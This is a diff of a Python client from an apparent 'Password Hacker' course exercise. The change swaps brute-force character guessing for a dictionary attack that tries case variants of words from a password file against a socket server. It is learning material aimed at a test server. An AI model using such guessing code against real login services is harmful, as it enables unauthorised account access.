@@ -1,6 +1,11 @@
 import socket
 from cmdline import get_cmdline_args
-from pwd_combi import get_pwd_iterator, get_elements_list
+from pwd_combi import (ELEMENTS_LIST,
+                       verify_pwd_crack,
+                       gen_case_combos_for_word,
+                       get_pwd_data,
+                       )
+from socket_conn import socket_operation
 
 
 def main():
@@ -8,15 +13,26 @@ def main():
     server_data = (inputs_cmdline.ipaddress, inputs_cmdline.port)
     with socket.socket() as client_socket:
         client_socket.connect(server_data)
-        for i in range(1, len(all_elements) + 1):
-            pwd_iter = get_pwd_iterator(iterator=all_elements, n=i)
-            for j in pwd_iter:
-                client_socket.send(''.join(j).encode())
-                response_bytes = client_socket.recv(1024)
-                if response_bytes.decode() == "Connection success!":
-                    return ''.join(j)
+        for pwd in passwords:
+            if pwd.isalpha():
+                pwd_combos = gen_case_combos_for_word(pwd)
+                for pwd_combo in pwd_combos:
+                    response = socket_operation(socket_connection=client_socket,
+                                                msg_to_send=pwd_combo)
+                    if verify_pwd_crack(msg=response):
+                        return pwd_combo
+            response = socket_operation(socket_connection=client_socket,
+                                        msg_to_send=pwd)
+            if verify_pwd_crack(msg=response):
+                return pwd
 
 
 if __name__ == "__main__":
-    all_elements = get_elements_list()
+    pwd_file = ("/Users/hello/Desktop/dev/tracks_hs/python_core/Password Hacker (Python)/Password Hacker ("
+                "Python)/task/passwords.txt")
+    passwords = get_pwd_data(file_path=pwd_file)
+
+    # for stage 2
+    all_elements = ELEMENTS_LIST
+
     print(main())
